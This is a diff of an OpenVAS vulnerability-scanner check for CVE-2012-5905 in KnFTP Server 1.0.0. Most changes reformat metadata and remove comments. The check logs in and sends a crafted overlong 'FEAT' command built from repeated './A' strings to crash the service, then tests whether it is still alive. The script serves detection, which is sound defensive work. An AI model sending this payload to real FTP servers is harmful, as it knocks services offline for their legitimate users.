@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: secpod_knftpd_feat_cmd_dos_vuln.nasl 5351 2017-02-20 08:03:12Z mwiegand $
+# $Id: secpod_knftpd_feat_cmd_dos_vuln.nasl 11374 2018-09-13 12:45:05Z asteins $
 #
 # KnFTP Server 'FEAT' Command Remote Denial of Service Vulnerability
 #
@@ -27,12 +27,12 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.902826");
-  script_version("$Revision: 5351 $");
+  script_version("$Revision: 11374 $");
   script_cve_id("CVE-2012-5905");
   script_bugtraq_id(52805);
   script_tag(name:"cvss_base", value:"4.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:N/I:N/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2017-02-20 09:03:12 +0100 (Mon, 20 Feb 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-13 14:45:05 +0200 (Thu, 13 Sep 2018) $");
   script_tag(name:"creation_date", value:"2012-03-29 16:16:16 +0530 (Thu, 29 Mar 2012)");
   script_name("KnFTP Server 'FEAT' Command Remote Denial of Service Vulnerability");
   script_category(ACT_DENIAL);
@@ -41,33 +41,20 @@ if(description)
   script_dependencies("find_service_3digits.nasl");
   script_require_ports("Services/ftp", 21);
 
-  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/52805");
-  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18671");
-  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/111296/knftpd-dos.txt");
+  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/52805");
+  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18671");
+  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/111296/knftpd-dos.txt");
 
-  tag_impact = "Successful exploitation will allow remote attackers to crash the
-  affected application, denying service to legitimate users.
-
-  Impact Level: Application";
-
-  tag_affected = "KnFTP Server version 1.0.0";
-
-  tag_insight = "The flaw is caused by an error when handling 'FEAT' command, which
-  can be exploited to crash the FTP service by sending specially crafted FTP commands.";
-
-  tag_solution = "No solution or patch was made available for at least one year
-  since disclosure of this vulnerability. Likely none will be provided anymore.
-  General solution options are to upgrade to a newer release, disable respective
-  features, remove the product or replace the product by another one.";
-
-  tag_summary = "This host is running KnFTP Server and is prone to denial of service
-  vulnerability.";
-
-  script_tag(name:"impact", value:tag_impact);
-  script_tag(name:"affected", value:tag_affected);
-  script_tag(name:"insight", value:tag_insight);
-  script_tag(name:"solution", value:tag_solution);
-  script_tag(name:"summary", value:tag_summary);
+  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to crash the
+  affected application, denying service to legitimate users.");
+  script_tag(name:"affected", value:"KnFTP Server version 1.0.0");
+  script_tag(name:"insight", value:"The flaw is caused by an error when handling 'FEAT' command, which
+  can be exploited to crash the FTP service by sending specially crafted FTP commands.");
+  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
+  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
+  release, disable respective features, remove the product or replace the product by another one.");
+  script_tag(name:"summary", value:"This host is running KnFTP Server and is prone to denial of service
+  vulnerability.");
 
   script_tag(name:"solution_type", value:"WillNotFix");
   script_tag(name:"qod_type", value:"remote_vul");
@@ -78,28 +65,15 @@ if(description)
 
 include("ftp_func.inc");
 
-## Variable Initialization
-soc = 0;
-soc1 = 0;
-pass = "";
-user = "";
-banner = "";
-exploit = "";
-ftpPort = 0;
-login_details = "";
-
-## Get the default port of FTP
 ftpPort = get_kb_item("Services/ftp");
 if(! ftpPort){
   ftpPort = 21;
 }
 
-## check port status
 if(! get_port_state(ftpPort)){
   exit(0);
 }
 
-## Confirm the Application
 banner = get_ftp_banner(port:ftpPort);
 if(! banner || "220 FTP Server ready." >!< banner){
   exit(0);
@@ -111,7 +85,6 @@ if(! soc){
   exit(0);
 }
 
-## Check for the user name and password
 user = get_kb_item("ftp/login");
 pass = get_kb_item("ftp/password");
 
@@ -122,13 +95,11 @@ if(!pass) {
   pass = "secret";
 }
 
-## Try to Login
 login_details = ftp_log_in(socket:soc, user:user, pass:pass);
 if(! login_details){
   exit(0);
 }
 
-## Build Exploit
 exploit = "FEAT " + crap(data:"./A",length:256*3);
 
 ## Send the Attack Request
@@ -136,7 +107,6 @@ ftp_send_cmd(socket:soc, cmd:exploit);
 ftp_close(socket:soc);
 sleep(3);
 
-## Open the socket to confirm FTP server is alive
 soc1 = open_sock_tcp(ftpPort);
 if(! soc1)
 {
